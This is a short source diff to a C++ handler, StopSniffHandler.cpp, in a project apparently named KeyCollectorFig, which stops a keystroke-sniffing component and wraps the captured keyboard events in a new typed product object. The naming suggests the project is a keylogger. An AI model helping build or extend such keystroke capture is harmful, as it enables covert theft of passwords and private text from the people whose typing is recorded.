+++ KeyCollectorFig/KeyCollectorFig/Operations/StopSniffHandler.cpp
@@ -1,11 +1,12 @@
 ﻿#include "StopSniffHandler.hpp"
 
 #include "ActiveKeySniff.hpp"
+#include "Products/KeyboardEventsTypedProduct.hpp"
 
 void StopSniffHandler::run()
 {
 	ActiveKeySniff::stop();
 
-	append(std::make_unique<KeyboardEventsProduct>(std::move(ActiveKeySniff::g_keyboard_events)));
+	append(std::make_unique<KeyboardEventsTypedProduct>(std::move(ActiveKeySniff::g_keyboard_events)));
 	finished();
 }
